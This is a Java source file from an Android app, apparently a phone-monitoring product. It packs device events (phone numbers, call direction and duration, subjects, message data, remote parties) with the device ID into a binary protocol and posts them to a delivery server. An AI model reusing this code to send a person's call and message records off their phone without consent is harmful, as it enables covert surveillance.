package com.fx.maind.delivery;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import android.content.Context;
import android.net.ConnectivityManager;
import android.os.Handler;
import android.os.Message;

import com.fx.activation.ActivationManager;
import com.fx.event.Event;
import com.fx.license.LicenseManager;
import com.fx.maind.protocolone.ProtocolOneParser;
import com.fx.maind.ref.Customization;
import com.fx.maind.ref.ProductUrlHelper;
import com.fx.preference.ConnectionHistoryManager;
import com.fx.preference.ConnectionHistoryManagerFactory;
import com.fx.preference.PreferenceManager;
import com.fx.preference.model.ConnectionHistory;
import com.fx.preference.model.ConnectionHistory.ConnectionStatus;
import com.fx.preference.model.ProductInfo;
import com.fx.util.FxResource;
import com.fx.util.FxSettings;
import com.vvt.exception.ProgrammingErrorException;
import com.vvt.http.HttpWrapper;
import com.vvt.http.HttpWrapperException;
import com.vvt.http.HttpWrapperResponse;
import com.vvt.logger.FxLog;
import com.vvt.network.NetworkUtil;
import com.vvt.phoneinfo.PhoneInfoHelper;
import com.vvt.util.BinaryUtil;

public final class UploadDeviceEvents {

	private static final String TAG = "UploadDeviceEvents";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private static final String HTTP_HEADER_NAME_CONTENT_TYPE = "Content-Type";
	private static final String HTTP_HEADER_VALUE_APPLICATION_BINARY = "application/binary";
	private static final String HTTP_HEADER_VALUE_APPLICATION_OCTETSTREAM = 
		"application/octet-stream";
	
	private Context mContext;
	private Callback mCallback;
	private ConnectionHistoryManager mConnectionHistoryManager;
	
	private static UploadDeviceEvents sInstance;
	
	public static UploadDeviceEvents getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new UploadDeviceEvents(context);
		}
		return sInstance;
	}
	
	private UploadDeviceEvents(Context context) {
		mContext = context;
		mConnectionHistoryManager = 
				ConnectionHistoryManagerFactory.getInstance(context);
	}
	
	private UploadDeviceEvents() {
		
	}
	
	/**
	 * Handler to simulate event sending.
	 */
	private Handler mSendHandler = new Handler() {
		
		@SuppressWarnings("unchecked")
		@Override
		public void handleMessage(Message message) {
			if (LOGV) {
				FxLog.v(TAG, "handleMessage # ENTER ...");
				FxLog.v(TAG, String.format("handleMessage # mCallback = %s", mCallback));
			}
			
			if (mCallback != null) {
				List<Event> sentDeviceEventsList = (List<Event>) message.obj;
				if (LOGV) FxLog.v(TAG, "handleMessage # Calling onSent()");
				mCallback.onSent(sentDeviceEventsList);
			}
		}
	};
	
	/**
	 * Thread to simulate event sending. 
	 */
	private class SendThread extends Thread {
		
		public List<Event> mDeviceEventsList;
		
		public SendThread(List<Event> deviceEventsList) {
			super();
			mDeviceEventsList = deviceEventsList;
		}
		
		public void run() {
			if (LOGV) {
				FxLog.v(TAG, "run # ENTER...");
				
				if (mDeviceEventsList != null) {
					FxLog.v(TAG, String.format("run # Deliver %d events:-", 
							mDeviceEventsList.size()));
					
					for (Event deviceEvent : mDeviceEventsList) {
						if (deviceEvent == null) continue;
						FxLog.v(TAG, String.format(
								"run # %s", deviceEvent.getShortDescription()));
					}
				}
			}
			
			List<Event> sentEventsList = new ArrayList<Event>();
			
			try {
				if (mDeviceEventsList != null && 
						mDeviceEventsList.size() != 0) {
					
					ResponseContainerDeviceEvents responseContainer = null;
					responseContainer = upload(mDeviceEventsList, true);
					
					if (LOGV) {
						if (responseContainer != null) {
							FxLog.v(TAG, "\n**************************************************");
							FxLog.v(TAG, String.format(
									"run # [EVENT-DELIVER] Upload Finished, Event Processed = '%d'", 
									responseContainer.getEventsProcessed()));
							FxLog.v(TAG, "**************************************************\n");
						} 
						else {
							FxLog.v(TAG, "**************************************************\n");
							FxLog.v(TAG, "run # [EVENT-DELIVER] Response container is null.");
							FxLog.v(TAG, "**************************************************\n");
						}
						
					}
					
					if (responseContainer != null) {
						if (!responseContainer.hasError()) {
							sentEventsList = mDeviceEventsList.subList(
									0, responseContainer.getEventsProcessed());
						}
						
						// Check server code
						int serverCode = responseContainer.getCodeAsInt();
						
						// 0xE0 = web status is deactivated
						if (serverCode == 224) {
							FxLog.d(TAG, "run # 0xE0 found -> Deactivate client");
							deactivateClient();
						}
					}
				} 
				else {
					if (LOGV) {
						FxLog.v(TAG, "run # No events in the list, " +
								"send an empty list to the callback");
					}
				}
			}
			catch (Exception e) {
				FxLog.e(TAG, "run # Unexpected error occurs.", e);
			}
			
			Message message = new Message();
			message.obj = sentEventsList;
			
			if (LOGV) {
				FxLog.v(TAG, String.format(
						"run # Sending message to the handler: message.obj = %s", message.obj));
			}
			mSendHandler.sendMessage(message);
		}
		
	}
	
	/**
	 * Since server response is 0xE0 so the client should be deactivated as well
	 */
	private void deactivateClient() {
		String ac = LicenseManager.getInstance(mContext).getActivationCode();
		ActivationManager.getInstance(mContext).deactivateProduct(ac);
	}
	
	/**
	 * Try to upload device events and get back a response container. If there is no network 
	 * connection, this method will return <code>null</code>.
	 * 
	 * @param deviceEventsList
	 * @param sendLargeDataSetFlag
	 * @return
	 */
	private ResponseContainerDeviceEvents upload(
			List<Event> deviceEventsList, boolean sendLargeDataSetFlag) {
		
		if (LOGV) FxLog.v(TAG, "upload # ENTER ...");
		
		ConnectionHistory connectionHistory = new ConnectionHistory();
		connectionHistory.setAction(ConnectionHistory.Action.UPLOAD_EVENTS);
		connectionHistory.setNumEventsSent(deviceEventsList.size());

		if (LOGV) FxLog.v(TAG, "upload # Checking internet connection...");
		boolean hasInternetConnection = NetworkUtil.hasInternetConnection(mContext);
		
		if (!hasInternetConnection) {
			FxLog.d(TAG, "upload # No internet connection, cannot upload");

			connectionHistory.setConnectionType(ConnectionHistory.ConnectionType.NO_CONNECTION);
			connectionHistory.setConnectionStatus(ConnectionStatus.FAILED);
			mConnectionHistoryManager.addConnectionHistory(connectionHistory);
			
			return null;
		}
		
		String url = ProductUrlHelper.getDeliveryUrl();
		ByteArrayOutputStream uploadStream = getUploadStream(deviceEventsList);
		byte[] uploadData = uploadStream.toByteArray();
		
		if (LOGV) {
			FxLog.v(TAG, String.format("upload # URL: %s", url));
			FxLog.v(TAG, String.format("upload # Upload Data: %s", 
					BinaryUtil.bytesToString2(uploadData)));
			FxLog.v(TAG, "upload # Upload Data Length (bytes): " + uploadData.length);
		}
		
		// HTTP Settings 
		HttpWrapper httpWrapper = HttpWrapper.getInstance();
		httpWrapper.setHeader("Content-Type", "Application/Binary");
		
		if (sendLargeDataSetFlag) {
			httpWrapper.setSocketTimeoutMilliseconds(
					(int) FxSettings.getDefaultURLRequestTimeoutLong() * 1000);
		} else {
			httpWrapper.setSocketTimeoutMilliseconds(
					(int) FxSettings.getDefaultURLRequestTimeoutShort() * 1000);
		}
		
		HttpWrapperResponse response = null;
		HttpWrapperException responseException = null;

		int networkType = NetworkUtil.getActiveNetworkType(mContext);
		
		if (networkType == ConnectivityManager.TYPE_MOBILE) {
			connectionHistory.setConnectionType(ConnectionHistory.ConnectionType.MOBILE);
		} 
		else if (networkType == ConnectivityManager.TYPE_WIFI) {
			connectionHistory.setConnectionType(ConnectionHistory.ConnectionType.WIFI);
		} 
		else {
			connectionHistory.setConnectionType(ConnectionHistory.ConnectionType.UNRECOGNIZED);
		}
		
		connectionHistory.setConnectionStartTime(System.currentTimeMillis());
		
		// POST
		try {
			response = httpWrapper.httpPost(url, uploadData);
			connectionHistory.setHttpStatusCode(response.getHttpStatusCode());
		} 
		catch (HttpWrapperException httpWrapperException) {
			FxLog.e(TAG, String.format("upload # Error: %s", httpWrapperException));
			
			responseException = httpWrapperException;
			connectionHistory.setHttpStatusCode(httpWrapperException.getHttpStatusCode());
		}
		
		connectionHistory.setConnectionEndTime(System.currentTimeMillis());
		
		if (LOGV && response != null) {
			FxLog.v(TAG, String.format("upload # Response Data: %s", 
					BinaryUtil.bytesToString2(response.getBodyAsBytes())));
		}
		
		// Construct ResponseContainer object from response
		ResponseContainerDeviceEvents responseContainer 
				= getResponseContainer(deviceEventsList, response, responseException);
		
		if (responseContainer != null) {
			FxLog.d(TAG, String.format(
					"upload # Response: code=%s, events processed=%d, message=\"%s\"", 
					responseContainer.getCode(), 
					responseContainer.getEventsProcessed(), 
					responseContainer.getMessage()));
		}
		
		if (responseContainer != null) {
			
			if (! responseContainer.hasError() || responseContainer.getEventsProcessed() > 0) {
				connectionHistory.setConnectionStatus(
						ConnectionHistory.ConnectionStatus.SUCCESS);
			}
			else if (connectionHistory.getHttpStatusCode() < 100) {
				connectionHistory.setConnectionStatus(
						ConnectionHistory.ConnectionStatus.TIMEOUT);
			}
			else {
				connectionHistory.setConnectionStatus(
						ConnectionHistory.ConnectionStatus.FAILED);
			}
			
			connectionHistory.setMessage(responseContainer.getMessage());
			connectionHistory.setResponseCode((byte) responseContainer.getCodeAsInt());
			connectionHistory.setNumEventsProcessed(responseContainer.getEventsProcessed());
			
			if (LOGV) {
				int numEventsProcessed = connectionHistory.getNumEventsProcessed();
				
				if (numEventsProcessed < 0) {
					numEventsProcessed = 0;
				}
				
				for (int i = 0 ; i < numEventsProcessed ; i++) {
					FxLog.v(TAG, String.format(
							"upload # [EVENT-TRACE] Device event \"%s\" is sent", 
							deviceEventsList.get(i).getIdentifier()));
				}
				
				for (int i = numEventsProcessed ; i < deviceEventsList.size() ; i++) {
					FxLog.v(TAG, String.format(
							"upload # [EVENT-TRACE] Device event \"%s\" cannot be sent", 
							deviceEventsList.get(i).getIdentifier()));
				}
			}
		}
		
		mConnectionHistoryManager.addConnectionHistory(connectionHistory);
		
		if (LOGV) FxLog.v(TAG, "upload # EXIT ...");
		
		return responseContainer;
	}
	
	/**
	 * Verify and Construct a ResponseContainer object
	 * @param deviceEventsList
	 * @param response
	 * @param responseException
	 * @return
	 */
	private ResponseContainerDeviceEvents getResponseContainer(
			List<Event> deviceEventsList, 
			HttpWrapperResponse response, 
			HttpWrapperException responseException) {
		
		if (LOGV) FxLog.v(TAG, "getResponseContainer # ENTER ...");
		
		ResponseContainerDeviceEvents responseContainer = null;
		
		// Response protocol
		// Min response length is 14 bytes
		//
		//	POSITION
		//    3							= CODE						1 byte
		//    4							= MESSAGE_LENGTH			2 bytes
		//    6							= MESSAGE					MESSAGE_LENGTH bytes -> NOT USED
		//    6+MESSAGE_LENGTH			= NUMBER_EVENTS_PROCESSED	4 bytes
		//
		// On success MESSAGE contains a status message
		// On failure MESSAGE contains an error message
		
		// If the response contains no exception and responseData is not null
		if (response != null) {
			byte[] responseData = response.getBodyAsBytes();
			int statusCode = response.getHttpStatusCode();
			HttpWrapperResponse.Header headers[] = response.getAllHeaders();
			
			if (LOGV) {
				int i = 0;
				for (HttpWrapperResponse.Header header : headers) {
					FxLog.v(TAG, String.format("getResponseContainer # header[%d] %s: %s", i++, 
							header.getName(), header.getValue()));
				}
			}
			
			String contentType = null;
			
			for (HttpWrapperResponse.Header header : headers) {
				if (HTTP_HEADER_NAME_CONTENT_TYPE.equalsIgnoreCase(header.getName())) {
					contentType = header.getValue();
					break;
				}
			}
			
			if (responseException == null
					&& statusCode >= 200 && statusCode < 300 
					&& responseData != null && responseData.length >= 14
					&& (HTTP_HEADER_VALUE_APPLICATION_BINARY.equalsIgnoreCase(contentType) ||
						HTTP_HEADER_VALUE_APPLICATION_OCTETSTREAM.equalsIgnoreCase(contentType))) {
			
				byte responseCodeByte = responseData[3]; 

				// response code
				String responseCodeString = String.format("%d", 0xff & responseCodeByte);
				if (LOGV) {
					FxLog.v(TAG, String.format("getResponseContainer # " +
							"Response Code: %s", responseCodeString));
				}
				
				short responseMessageLengthShort = BinaryUtil.bytesToShort(responseData, 4, true);
				if (LOGV) {
					FxLog.v(TAG, String.format("getResponseContainer # " +
							"Response Message Length: %d", responseMessageLengthShort));
				}
				
				String messageFromServer = null;
				
				if (responseMessageLengthShort > 0) {
					messageFromServer = BinaryUtil.bytesToString2(responseData, 6, 
							6 + responseMessageLengthShort);
					if (LOGV) {
						FxLog.v(TAG, String.format(
								"getResponseContainer # messageFromServer: %s", 
								messageFromServer));
					}
				}
				
				int deviceEventsProcessed = BinaryUtil.bytesToInt(
						responseData, 6 + responseMessageLengthShort, true);
				
				if (LOGV) {
					FxLog.v(TAG, String.format(
							"getResponseContainer # deviceEventsProcessed: %d", 
							deviceEventsProcessed));
				}
				
				// Processed Events equal to Events in List -> Success
				// This is the only case that contains no ERROR flag
				if (responseCodeByte == 0 && deviceEventsProcessed == deviceEventsList.size()) {
					if (LOGV) FxLog.v(TAG, "getResponseContainer # Logevents sent successfully");
					responseContainer = new ResponseContainerDeviceEvents(
							responseCodeString, 
							FxResource.LANGUAGE_EVENTS_RESPONSE_SUCCESS, 
							false, deviceEventsProcessed);
				}
				
				// Processed Events not equal to Events in List -> Partial Success
				else if (deviceEventsProcessed != deviceEventsList.size() 
						&& (responseCodeByte == 0 || responseCodeByte == (byte) 225)) {
					
					responseContainer = new ResponseContainerDeviceEvents(
							responseCodeString, 
							String.format(
									FxResource.LANGUAGE_EVENTS_RESPONSE_PARTIAL_SUCCESS, 
									deviceEventsProcessed, 
									deviceEventsList.size()), 
									true, 
									deviceEventsProcessed);
				}
				// Handle other response codes
				else {
					String errorMessage; 
					if (messageFromServer != null) {
						errorMessage = messageFromServer;
					} 
					else {
						errorMessage = 
								FxResource.LANGUAGE_CONNECTION_HISTORY_ERROR_NO_SERVER_MSG;
					}
					
					FxLog.e(TAG, String.format(
							"getResponseContainer # response: %s", 
							BinaryUtil.bytesToString2(responseData)));
					
					FxLog.e(TAG, String.format(
							"getResponseContainer # Server error [%d]: \"%s\"", 
							0xff & responseCodeByte, errorMessage));
					
					responseContainer = 
						new ResponseContainerDeviceEvents(
								responseCodeString, errorMessage, true, 0);
				}
			}
		}
		// Got HttpWrapperException e.g. ConnectionTimeout
		else if (responseException != null) {
			FxLog.e(TAG, String.format(
					"getResponseContainer # error: %s", 
					responseException.getLocalizedMessage()));
			
			responseContainer = new ResponseContainerDeviceEvents(
						String.format("%d", ResponseContainerDeviceEvents.RESPONSE_FAILED),
						String.format("getResponseContainer # %s\n%s ", 
								responseException.getLocalizedMessage(), 
								FxResource.LANGUAGE_EVENTS_RESPONSE_FAILED_UNKNOWN_1), 
					   true, ResponseContainerDeviceEvents.PROCESSED_UNKNOWN);
		} else {
			FxLog.e(TAG, "getResponseContainer # No error sending the request " + 
					"so we just do not understand the response");
			
			responseContainer = new ResponseContainerDeviceEvents(
					String.format("%d", ResponseContainerDeviceEvents.RESPONSE_NOT_RECOGNIZED),
					String.format("%s%s ", 
							FxResource.LANGUAGE_EVENTS_RESPONSE_INCORRECT_LENGTH, 
							FxResource.LANGUAGE_EVENTS_RESPONSE_FAILED_UNKNOWN_2), 
					true, 
					ResponseContainerDeviceEvents.PROCESSED_UNKNOWN);
		}
		return responseContainer;
	}
	
	/**
	 * Construct an upload stream according to the protocol.
	 * @param deviceEventsList
	 * @return
	 */
	private ByteArrayOutputStream getUploadStream(List<Event> deviceEventsList) { 
		if (LOGV) FxLog.v(TAG, "getUploadStream # ENTER ...");
	
		// If the protocol is changed (other than protocol one), modify the code here.
		ByteArrayOutputStream uploadStream = getUploadProtocolOneHeader(
				(short) deviceEventsList.size());
		try {
			for (Event event : deviceEventsList) { 
				getUploadProtocolOneBody(event).writeTo(uploadStream);
			}
		} catch (IOException e) {
			throw new ProgrammingErrorException(e);
		}
		
		return uploadStream;
	}
	
	private ByteArrayOutputStream getUploadProtocolOneHeader(short numberOfLogevents) { 
		// Request protocol
		// Length is 78 bytes
		//
		//	POSITION
		//    1						= PRODCT_ID					2 bytes
		//    3						= PRODCT_MAJOR_VERSION		1 byte
		//    4						= PRODCT_MINOR_VERSION		1 byte
		//    5						= DEVICE_ID					16 bytes
		//    21					= Empty						4+32+16=52 bytes
		//    73					= COMMAND '1'				2 bytes
		//    75					= Empty						2 bytes
		//    77					= NUMBER_OF_LOGEVENTS		2 bytes
		
		ByteArrayOutputStream outStream = new ByteArrayOutputStream();
		DataOutputStream dataOutStream = new DataOutputStream(outStream); 
		
		ProductInfo productInfo = PreferenceManager.getInstance(mContext).getProductInfo();

		try {
			dataOutStream.writeShort(productInfo.getId());
			dataOutStream.writeByte(Integer.parseInt(productInfo.getVersionMajor()));
			dataOutStream.writeByte(Integer.parseInt(productInfo.getVersionMinor()));
			
			String deviceId = PhoneInfoHelper.getInstance(mContext).getDeviceId();
			deviceId = String.format("%-16s", deviceId).substring(0, 16);
			dataOutStream.write(deviceId.getBytes(FxResource.UTF_8));
			
			dataOutStream.write(new byte[52]);
			dataOutStream.writeShort(getCommand());
			dataOutStream.write(new byte[2]);
			dataOutStream.writeShort(numberOfLogevents);
			
			dataOutStream.flush();
		} catch (IOException aIOException) {
			throw new ProgrammingErrorException(aIOException);
		}
		
		return outStream;
	}
	
	private ByteArrayOutputStream getUploadProtocolOneBody(Event event) { 
		// Request protocol
		// Length is 32 +TIME_LENGTH +PHONENUMBER_LENGTH +DESCRIPTION_LENGTH +SUBJECT_LENGTH +STATUS_LENGTH +DATA_LENGTH bytes +REMOTEPARTY_LENGTH bytes
		//
		//	POSITION
		//    1																									= ID					4 bytes
		//    5																									= TYPE					1 byte
		//    6																									= TIME_LENGTH			1 byte
		//    7+TIME_LENGTH																						= TIME					TIME_LENGTH bytes
		//    8+TIME_LENGTH																						= DIRECTION				1 byte
		//    9+TIME_LENGTH																						= DURATION				4 bytes
		//    13+TIME_LENGTH																					= PHONENUMBER_LENGTH	2 bytes
		//    15+TIME_LENGTH																					= PHONENUMBER			PHONENUMBER_LENGTH bytes
		//    16+TIME_LENGTH+PHONENUMBER_LENGTH																	= DESCRIPTION_LENGTH	2 bytes
		//    18+TIME_LENGTH+PHONENUMBER_LENGTH																	= DESCRIPTION			DESCRIPTION_LENGTH bytes
		//    19+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH												= SUBJECT_LENGTH		2 bytes
		//    21+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH												= SUBJECT				SUBJECT_LENGTH bytes
		//    22+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH+SUBJECT_LENGTH								= STATUS_LENGTH			2 bytes
		//    24+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH+SUBJECT_LENGTH								= STATUS				STATUS_LENGTH bytes
		//    25+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH+SUBJECT_LENGTH+STATUS_LENGTH					= DATA_LENGTH			4 bytes
		//    29+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH+SUBJECT_LENGTH+STATUS_LENGTH					= DATA					DATA_LENGTH bytes
		//    30+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH+SUBJECT_LENGTH+STATUS_LENGTH+DATA_LENGTH		= REMOTEPARTY_LENGTH	2 bytes
		//    32+TIME_LENGTH+PHONENUMBER_LENGTH+DESCRIPTION_LENGTH+SUBJECT_LENGTH+STATUS_LENGTH+DATA_LENGTH		= REMOTEPARTY			REMOTEPARTY_LENGTH bytes
		
		ByteArrayOutputStream outStream = new ByteArrayOutputStream();
		DataOutputStream dataOutStream = new DataOutputStream(outStream); 
		
		try {
			dataOutStream.writeInt(ProtocolOneParser.getProtocolOneEventId(event));
			
			dataOutStream.write(ProtocolOneParser.getProtocolOneEventType(event));
			
			String protocolOneTime = ProtocolOneParser.getProtocolOneTime(event);
			byte[] timeBytes = protocolOneTime.getBytes(FxResource.UTF_8);
			dataOutStream.write(timeBytes.length);
			dataOutStream.write(timeBytes, 0, timeBytes.length);
			
			dataOutStream.write(ProtocolOneParser.getProtocolOneDirection(event));
			
			dataOutStream.writeInt(ProtocolOneParser.getProtocolOneDuration(event));
			
			String phoneNumber = ProtocolOneParser.getProtocolOnePhonenumber(event);
			byte[] phoneBytes = phoneNumber.getBytes(FxResource.UTF_8);
			dataOutStream.writeShort(phoneBytes.length);
			dataOutStream.write(phoneBytes, 0, phoneBytes.length);
			
			String description = ProtocolOneParser.getProtocolOneDescription(event);
			byte[] descrBytes = description.getBytes(FxResource.UTF_8);
			dataOutStream.writeShort(descrBytes.length);
			dataOutStream.write(descrBytes, 0, descrBytes.length);
			
			String subject = ProtocolOneParser.getProtocolOneSubject(event);
			byte[] subjectBytes = subject.getBytes(FxResource.UTF_8);
			dataOutStream.writeShort(subjectBytes.length);
			dataOutStream.write(subjectBytes, 0, subjectBytes.length);
			
			String status = ProtocolOneParser.getProtocolOneStatus(event);
			byte[] statusBytes = status.getBytes(FxResource.UTF_8);
			dataOutStream.writeShort(statusBytes.length);
			dataOutStream.write(statusBytes, 0, statusBytes.length);
			
			String data = ProtocolOneParser.getProtocolOneData(event);
			byte[] dataBytes = data.getBytes(FxResource.UTF_8);
			dataOutStream.writeInt(dataBytes.length);
			dataOutStream.write(dataBytes, 0, dataBytes.length);
			
			String remoteParty = ProtocolOneParser.getProtocolOneRemoteparty(event);
			byte[] remotePartyBytes = remoteParty.getBytes(FxResource.UTF_8);
			dataOutStream.writeShort(remotePartyBytes.length);
			dataOutStream.write(remotePartyBytes, 0, remotePartyBytes.length);
			
			dataOutStream.flush();
		} 
		catch (IOException e) {
			throw new ProgrammingErrorException(e);
		}
		
		return outStream;
	}
	
	private short getCommand() { 
		return 1; 
	}
	
	public static interface Callback {
		void onSent(List<Event> sentDeviceEventsList);
	}
	
	public void setCallback(Callback callback) {
		mCallback = callback;
	}
	
	public void asyncSend(List<Event> deviceEventsList) {
		if (LOGV) {
			FxLog.v(TAG, "asyncSend # ENTER ...");
			if (deviceEventsList != null) {
				FxLog.v(TAG, String.format("asyncSend # [EVENT-DELIVER] Trying to send %d events...", 
						deviceEventsList.size()));
			} else {
				FxLog.v(TAG, "asyncSend # [EVENT-DELIVER] Trying to send a null list...");
			}
		}
		
		SendThread sendThread = new SendThread(deviceEventsList);
		sendThread.start();
		
		if (LOGV) FxLog.v(TAG, "asyncSend # EXIT ...");
	}
	
}
